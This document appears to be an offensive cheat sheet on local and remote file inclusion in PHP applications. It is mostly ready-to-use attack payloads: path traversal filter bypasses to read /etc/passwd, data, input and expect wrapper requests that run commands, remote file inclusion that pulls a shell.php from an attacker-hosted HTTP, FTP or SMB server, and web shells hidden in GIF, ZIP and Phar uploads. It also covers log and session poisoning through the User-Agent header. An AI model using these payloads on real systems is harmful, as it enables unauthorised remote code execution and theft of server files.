Path Traversal

Usage

From GET requests

http://<serverIP>:<port>/index.php?language=../../../../etc/passwd

Bypassing

Bypass prefixes :

include("lang_" . $_GET['language']);

http://<serverIP>:<port>/index.php?language=/ ../../../../etc/passwd

Bypass search and replace with following payloads :

  • ....//
  • ..././
  • ....\/
$language = str_replace('../', '', $_GET['language']);

http://<serverIP>:<port>/index.php?language=....//....//....//....//etc/passwd

Bypass with URL encoding / double encoding (Burp Suite decoder tool) :

  • ../ encoded as %2e%2e%2f

Bypass approved paths :

if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

http://<serverIP>:<port>/index.php?language=./languages/../../../../etc/passwd

PHP Filters and Wrappers

Documentation

PHP configuration files :

  • Apache : /etc/php/X.Y/apache2/php.ini
  • Nginx : /etc/php/X.Y/fpm/php.ini

Usage

php://filter/read=<filter>/resource=<file>

A complete request would look like :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=php://filter/read=<filter>/resource=<file>

Base64 encode

php://filter/read=convert.base64-encode/resource=<file>

Data & Input wrappers

Check for allow_url_include setting :

Get configuration file :

curl "http://<serverIP>:<port>/<page>?<vulnerableParameter>=php://filter/read=convert.base64-encode/resource=../../../../<phpConfFile>"

Get expect value :

echo '<base64Encoded>' | base64 -d | grep allow_url_include
Data wrapper (GET method)

If enabled, a data wrapper attack is possible :

echo '<?php system($_GET["cmd"]); ?>' | base64

URL Encode the payload and submit a command with &cmd=<command> :

curl -s 'http://<serverIP>:<port>/<page>?<vulnerableParameter>=data://text/plain;base64,<base64PayloadURLEncoded>&cmd=<command>'
Input wrapper (POST method)

If vulnerable function accepts GET parameters :

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<serverIP>:<port>/<page>?<vulnerableParameter>=php://input&cmd=<command>"

if vulnerable function only accepts POST parameters :

curl -s -X POST --data '<\?php system('<command>')?>' "http://<serverIP>:<port>/<page>?<vulnerableParameter>=php://input"

Expect wrapper

Check for expect setting :

Get Configuration File:

curl "http://<serverIP>:<port>/<page>?<vulnerableParameter>=php://filter/read=convert.base64-encode/resource=../../../../<phpConfFile>"

Get allow_url_include value :

echo '<base64Encoded>' | base64 -d | grep expect
Expect wrapper
curl -s "http://<serverIP>:<port>/<page>?<vulnerableParameter>=expect://<command>"

Remote File Inclusion

Usage

Test first if the function is vulnerable to LFI (PHP filters & wrappers). If it is, try including a local file through an URL :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=http://127.0.0.1:80/index.php

Then write a malicious file :

  • PHP :
echo '<?php system($_GET["cmd"]); ?>' > shell.php

HTTP

Host the script :

sudo python3 -m http.server <listeningPort>

Execute the script :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=http://<remoteServerIP>:<listeningPort>/shell.php&cmd=<command>

FTP

Host the script :

sudo python -m pyftpdlib -p 21

Execute the script :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=ftp://<remoteServerIP>:<listeningPort>/shell.php&cmd=<command>

With authentication :

curl 'http://<serverIP>:<port>/<page>?<vulnerableParameter>=ftp://user:<password>@localhost/shell.php&cmd=<command>'

SMB

No need for allow_url_includesetting enabled

Host the script

impacket-smbserver -smb2support <shareName> $(pwd)

http://<serverIP>:<port>/<page>?<vulnerableParameter>=\\<remoteServerIP>\<shareName>\shell.php&cmd=command

Image Uploads

Usage

Image

Create a malicious .gif file (with magic bytes for file content check) :

echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

Once the file is uploaded, execute it with the File Inclusion vulnerability (search for its path by fuzzing or dissecting source code) :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=./<imagesDirectory>/shell.gif&cmd=<command>
Use ZIP wrapper

Create a ZIP archive :

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

http://<serverIP>:<port>/<page>?<vulnerableParameter>=zip://./<imagesDirectory>/shell.jpg%23shell.php&cmd=<command>
Use Phar wrapper

Create a file named shell.php :

<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

Compile into phar file and rename it :

php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

http://<serverIP>:<port>/<page>?<vulnerableParameter>=phar://./<imagesDirectory>/shell.jpg%2Fshell.txt&cmd=<command>

Log Poisoning

Documentation

Session files :

  • Linux : /var/lib/php/sessions/sess_<sessionToken>
  • Windows : C:\Windows\Temp\sess_<sessionToken>

Apache logs :

  • Linux : /var/log/apache2/[access.log][error.log]
  • Windows : C:\xampp\apache\logs\[access.log][error.log]

Nginx logs :

  • Linux : /var/log/nginx/[access.log][error.log]
  • Windows : C:\nginx\log\[access.log][error.log]

Some other logs we may be able to read :

  • /var/log/sshd.log
  • /var/log/mail
  • /var/log/vsftpd.log

Usage

Session file poisoning

Get session file :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=<sessionFilePath>/sess_<sessionToken>

If some parameters are under our control, we can try poisoning them with an URL encoded web shell :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

Now we can run commands :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=<sessionFilePath>/sess_<sessionToken>&cmd=<command>

User-Agent poisoning

Modify using Burp Suite or Curl, the User-Agent of a request to a custom web shell :

curl -s "http://<serverIP>:<port>/<page>" -A "<?php system($_GET['cmd']); ?>"

Commands can now be executed from the log file :

http://<serverIP>:<port>/<page>?<vulnerableParameter>=<logFilePath>&cmd=<command>

On Linux, the User-Agent is also present in the files :

  • /proc/self/environ
  • /proc/self/fd/<PID> (with <PID> ∈[1,50]\in[1,50] )
